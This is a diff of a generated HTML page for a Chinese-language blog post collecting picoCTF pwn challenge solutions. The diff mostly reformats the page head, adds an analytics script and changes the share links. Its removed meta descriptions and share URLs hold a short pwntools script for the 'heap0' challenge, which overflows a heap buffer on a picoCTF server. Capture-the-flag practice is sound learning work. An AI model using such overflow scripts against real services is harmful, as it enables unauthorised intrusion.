@@ -1,25 +1,30 @@
 <!DOCTYPE html>
 <html lang="zh-Hant-TW">
 <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
-  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
-  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
-  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
-  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
-  <script type="text/javascript" src="https://latest.cactus.chat/cactus.js"></script>
-  <link rel="stylesheet" href="https://latest.cactus.chat/style.css" type="text/css">
-  <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <title> 【Pico】Pwn 系列解題紀錄 | ErrorPro</title>
-  <link rel = 'canonical' href = 'http://localhost:1313/posts/picoctf/pwn/'>
-  <meta name="description" content="我覺得現在在看這句話的人超電">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="robots" content="all,follow">
-  <meta name="googlebot" content="index,follow,snippet,archive">
-  <meta property="og:url" content="http://localhost:1313/posts/picoctf/pwn/">
+    <link rel="preload" href="/%20lib/font-awesome/webfonts/fa-brands-400.woff2" as="font"
+        type="font/woff2" crossorigin="anonymous">
+    <link rel="preload" href="/%20lib/font-awesome/webfonts/fa-regular-400.woff2" as="font"
+        type="font/woff2" crossorigin="anonymous">
+    <link rel="preload" href="/%20lib/font-awesome/webfonts/fa-solid-900.woff2" as="font"
+        type="font/woff2" crossorigin="anonymous">
+    <link rel="preload" href="/%20lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font"
+        type="font/woff2" crossorigin="anonymous">
+    <script type="text/javascript" src="https://latest.cactus.chat/cactus.js"></script>
+    <link rel="stylesheet" href="https://latest.cactus.chat/style.css" type="text/css">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title> 【Pico】Pwn 系列解題紀錄 | ErrorPro</title>
+    <link rel='canonical' href='http://localhost:1313/posts/picoctf/pwn/'>
+    
+    <meta name="description" content="我覺得現在在看這句話的人超電">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="all,follow">
+    <meta name="googlebot" content="index,follow,snippet,archive">
+    <meta property="og:url" content="http://localhost:1313/posts/picoctf/pwn/">
   <meta property="og:site_name" content="ErrorPro">
   <meta property="og:title" content="【Pico】Pwn 系列解題紀錄">
   <meta property="og:description" content="【Pico】Pwn 系列解題紀錄 這篇只是用來放解題的程式碼，之後再補解題過程。
-heap0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #!/usr/bin/env python3 from pwn import * context.binary = &#39;./chall&#39; context.os = &#39;linux&#39; context.arch = &#39;amd64&#39; context.log_level = &#39;DEBUG&#39; if args.REMOTE: ip = &#39;tethys.picoctf.net&#39; port = 49849 p = remote(ip, port) else: p = process() p.sendline(&#34;2&#34;) p.sendline(b&#34;a&#34;*50) p.sendline(b&#34;4&#34;) p.interactive() heap1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #!">
+heap0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ">
   <meta property="og:locale" content="zh_Hant_TW">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
@@ -27,35 +32,50 @@ heap0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #!/usr/bin/env py
     <meta property="article:modified_time" content="2024-07-16T00:00:00+08:00">
     <meta property="article:tag" content="Ctf">
 
-  
+    
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="【Pico】Pwn 系列解題紀錄">
   <meta name="twitter:description" content="【Pico】Pwn 系列解題紀錄 這篇只是用來放解題的程式碼，之後再補解題過程。
-heap0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #!/usr/bin/env python3 from pwn import * context.binary = &#39;./chall&#39; context.os = &#39;linux&#39; context.arch = &#39;amd64&#39; context.log_level = &#39;DEBUG&#39; if args.REMOTE: ip = &#39;tethys.picoctf.net&#39; port = 49849 p = remote(ip, port) else: p = process() p.sendline(&#34;2&#34;) p.sendline(b&#34;a&#34;*50) p.sendline(b&#34;4&#34;) p.interactive() heap1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #!">
+heap0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ">
 
-  
-  
     
-  
-  
-  <link rel="stylesheet" href="http://localhost:1313/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css" integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N&#43;XoIuZg=="> 
+    
+    
+    
+    
+    <link rel="stylesheet" href="http://localhost:1313/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css" integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N&#43;XoIuZg==">
 
-  
-   <link rel="stylesheet" href="http://localhost:1313/css/highlight.css">  <link rel="stylesheet" href="http://localhost:1313/css/style-dark.css">  <link rel="stylesheet" href="http://localhost:1313/css/search.css">  <link rel="stylesheet" href="http://localhost:1313/css/cursor.css"> 
-  
+    
+    
+    <link rel="stylesheet" href="http://localhost:1313/css/highlight.css"> 
+    <link rel="stylesheet" href="http://localhost:1313/css/style-dark.css"> 
+    <link rel="stylesheet" href="http://localhost:1313/css/search.css"> 
+    <link rel="stylesheet" href="http://localhost:1313/css/cursor.css"> 
+    
     <!--[if lt IE 9]>
       <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
       <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
     <![endif]-->
-  
+    
 
-  
+    
 <link rel="icon" type="image/png" href="http://localhost:1313/images/favicon.ico" />
 
-  
-  
-</head>
+    
+    
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-LP899FV1TS"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
 
+  gtag('config', 'G-LP899FV1TS');
+</script>
+    
+    
+</head>
 <body class="max-width mx-auto px3 ltr">
   <div class="content index py4">
 
@@ -159,7 +179,7 @@ heap0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #!/usr/bin/env py
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=http%3a%2f%2flocalhost%3a1313%2fposts%2fpicoctf%2fpwn%2f&name=%e3%80%90Pico%e3%80%91Pwn%20%e7%b3%bb%e5%88%97%e8%a7%a3%e9%a1%8c%e7%b4%80%e9%8c%84&description=%e3%80%90Pico%e3%80%91Pwn%20%e7%b3%bb%e5%88%97%e8%a7%a3%e9%a1%8c%e7%b4%80%e9%8c%84%20%e9%80%99%e7%af%87%e5%8f%aa%e6%98%af%e7%94%a8%e4%be%86%e6%94%be%e8%a7%a3%e9%a1%8c%e7%9a%84%e7%a8%8b%e5%bc%8f%e7%a2%bc%ef%bc%8c%e4%b9%8b%e5%be%8c%e5%86%8d%e8%a3%9c%e8%a7%a3%e9%a1%8c%e9%81%8e%e7%a8%8b%e3%80%82%0aheap0%201%202%203%204%205%206%207%208%209%2010%2011%2012%2013%2014%2015%2016%2017%2018%2019%2020%2021%2022%20%23%21%2fusr%2fbin%2fenv%20python3%20from%20pwn%20import%20%2a%20context.binary%20%3d%20%26%2339%3b.%2fchall%26%2339%3b%20context.os%20%3d%20%26%2339%3blinux%26%2339%3b%20context.arch%20%3d%20%26%2339%3bamd64%26%2339%3b%20context.log_level%20%3d%20%26%2339%3bDEBUG%26%2339%3b%20if%20args.REMOTE%3a%20ip%20%3d%20%26%2339%3btethys.picoctf.net%26%2339%3b%20port%20%3d%2049849%20p%20%3d%20remote%28ip%2c%20port%29%20else%3a%20p%20%3d%20process%28%29%20p.sendline%28%26%2334%3b2%26%2334%3b%29%20p.sendline%28b%26%2334%3ba%26%2334%3b%2a50%29%20p.sendline%28b%26%2334%3b4%26%2334%3b%29%20p.interactive%28%29%20heap1%201%202%203%204%205%206%207%208%209%2010%2011%2012%2013%2014%2015%2016%2017%2018%2019%2020%2021%2022%2023%20%23%21" aria-label="Tumblr">
+    <a class="icon" href="http://www.tumblr.com/share/link?url=http%3a%2f%2flocalhost%3a1313%2fposts%2fpicoctf%2fpwn%2f&name=%e3%80%90Pico%e3%80%91Pwn%20%e7%b3%bb%e5%88%97%e8%a7%a3%e9%a1%8c%e7%b4%80%e9%8c%84&description=%3ch1%20id%3d%22picopwn-%e7%b3%bb%e5%88%97%e8%a7%a3%e9%a1%8c%e7%b4%80%e9%8c%84%22%3e%e3%80%90Pico%e3%80%91Pwn%20%e7%b3%bb%e5%88%97%e8%a7%a3%e9%a1%8c%e7%b4%80%e9%8c%84%3c%2fh1%3e%0a%3cp%3e%e9%80%99%e7%af%87%e5%8f%aa%e6%98%af%e7%94%a8%e4%be%86%e6%94%be%e8%a7%a3%e9%a1%8c%e7%9a%84%e7%a8%8b%e5%bc%8f%e7%a2%bc%ef%bc%8c%e4%b9%8b%e5%be%8c%e5%86%8d%e8%a3%9c%e8%a7%a3%e9%a1%8c%e9%81%8e%e7%a8%8b%e3%80%82%3c%2fp%3e%0a%3ch2%20id%3d%22heap0%22%3eheap0%3c%2fh2%3e%0a%3cdiv%20class%3d%22highlight%22%3e%3cdiv%20style%3d%22color%3a%23f8f8f2%3bbackground-color%3a%23282a36%3b-moz-tab-size%3a4%3b-o-tab-size%3a4%3btab-size%3a4%3b%22%3e%0a%3ctable%20style%3d%22border-spacing%3a0%3bpadding%3a0%3bmargin%3a0%3bborder%3a0%3b%22%3e%3ctr%3e%3ctd%20style%3d%22vertical-align%3atop%3bpadding%3a0%3bmargin%3a0%3bborder%3a0%3b%22%3e%0a%3cpre%20tabindex%3d%220%22%20style%3d%22color%3a%23f8f8f2%3bbackground-color%3a%23282a36%3b-moz-tab-size%3a4%3b-o-tab-size%3a4%3btab-size%3a4%3b%22%3e%3ccode%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%201%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%202%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%203%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%204%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%205%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%206%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%207%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%208%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%209%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e10%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e11%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e12%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e13%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e14%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e15%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e16%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e17%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e18%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e19%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e20%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e21%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e22%0a%3c%2fspan%3e%3c%2fcode%3e%3c%2fpr" aria-label="Tumblr">
       <i class="fab fa-tumblr " aria-hidden="true"></i>
     </a>
   </li>
@@ -670,7 +690,7 @@ heap0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #!/usr/bin/env py
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=http%3a%2f%2flocalhost%3a1313%2fposts%2fpicoctf%2fpwn%2f&name=%e3%80%90Pico%e3%80%91Pwn%20%e7%b3%bb%e5%88%97%e8%a7%a3%e9%a1%8c%e7%b4%80%e9%8c%84&description=%e3%80%90Pico%e3%80%91Pwn%20%e7%b3%bb%e5%88%97%e8%a7%a3%e9%a1%8c%e7%b4%80%e9%8c%84%20%e9%80%99%e7%af%87%e5%8f%aa%e6%98%af%e7%94%a8%e4%be%86%e6%94%be%e8%a7%a3%e9%a1%8c%e7%9a%84%e7%a8%8b%e5%bc%8f%e7%a2%bc%ef%bc%8c%e4%b9%8b%e5%be%8c%e5%86%8d%e8%a3%9c%e8%a7%a3%e9%a1%8c%e9%81%8e%e7%a8%8b%e3%80%82%0aheap0%201%202%203%204%205%206%207%208%209%2010%2011%2012%2013%2014%2015%2016%2017%2018%2019%2020%2021%2022%20%23%21%2fusr%2fbin%2fenv%20python3%20from%20pwn%20import%20%2a%20context.binary%20%3d%20%26%2339%3b.%2fchall%26%2339%3b%20context.os%20%3d%20%26%2339%3blinux%26%2339%3b%20context.arch%20%3d%20%26%2339%3bamd64%26%2339%3b%20context.log_level%20%3d%20%26%2339%3bDEBUG%26%2339%3b%20if%20args.REMOTE%3a%20ip%20%3d%20%26%2339%3btethys.picoctf.net%26%2339%3b%20port%20%3d%2049849%20p%20%3d%20remote%28ip%2c%20port%29%20else%3a%20p%20%3d%20process%28%29%20p.sendline%28%26%2334%3b2%26%2334%3b%29%20p.sendline%28b%26%2334%3ba%26%2334%3b%2a50%29%20p.sendline%28b%26%2334%3b4%26%2334%3b%29%20p.interactive%28%29%20heap1%201%202%203%204%205%206%207%208%209%2010%2011%2012%2013%2014%2015%2016%2017%2018%2019%2020%2021%2022%2023%20%23%21" aria-label="Tumblr">
+    <a class="icon" href="http://www.tumblr.com/share/link?url=http%3a%2f%2flocalhost%3a1313%2fposts%2fpicoctf%2fpwn%2f&name=%e3%80%90Pico%e3%80%91Pwn%20%e7%b3%bb%e5%88%97%e8%a7%a3%e9%a1%8c%e7%b4%80%e9%8c%84&description=%3ch1%20id%3d%22picopwn-%e7%b3%bb%e5%88%97%e8%a7%a3%e9%a1%8c%e7%b4%80%e9%8c%84%22%3e%e3%80%90Pico%e3%80%91Pwn%20%e7%b3%bb%e5%88%97%e8%a7%a3%e9%a1%8c%e7%b4%80%e9%8c%84%3c%2fh1%3e%0a%3cp%3e%e9%80%99%e7%af%87%e5%8f%aa%e6%98%af%e7%94%a8%e4%be%86%e6%94%be%e8%a7%a3%e9%a1%8c%e7%9a%84%e7%a8%8b%e5%bc%8f%e7%a2%bc%ef%bc%8c%e4%b9%8b%e5%be%8c%e5%86%8d%e8%a3%9c%e8%a7%a3%e9%a1%8c%e9%81%8e%e7%a8%8b%e3%80%82%3c%2fp%3e%0a%3ch2%20id%3d%22heap0%22%3eheap0%3c%2fh2%3e%0a%3cdiv%20class%3d%22highlight%22%3e%3cdiv%20style%3d%22color%3a%23f8f8f2%3bbackground-color%3a%23282a36%3b-moz-tab-size%3a4%3b-o-tab-size%3a4%3btab-size%3a4%3b%22%3e%0a%3ctable%20style%3d%22border-spacing%3a0%3bpadding%3a0%3bmargin%3a0%3bborder%3a0%3b%22%3e%3ctr%3e%3ctd%20style%3d%22vertical-align%3atop%3bpadding%3a0%3bmargin%3a0%3bborder%3a0%3b%22%3e%0a%3cpre%20tabindex%3d%220%22%20style%3d%22color%3a%23f8f8f2%3bbackground-color%3a%23282a36%3b-moz-tab-size%3a4%3b-o-tab-size%3a4%3btab-size%3a4%3b%22%3e%3ccode%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%201%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%202%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%203%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%204%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%205%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%206%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%207%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%208%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%209%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e10%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e11%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e12%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e13%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e14%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e15%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e16%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e17%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e18%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e19%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e20%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e21%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e22%0a%3c%2fspan%3e%3c%2fcode%3e%3c%2fpr" aria-label="Tumblr">
       <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
     </a>
   </li>
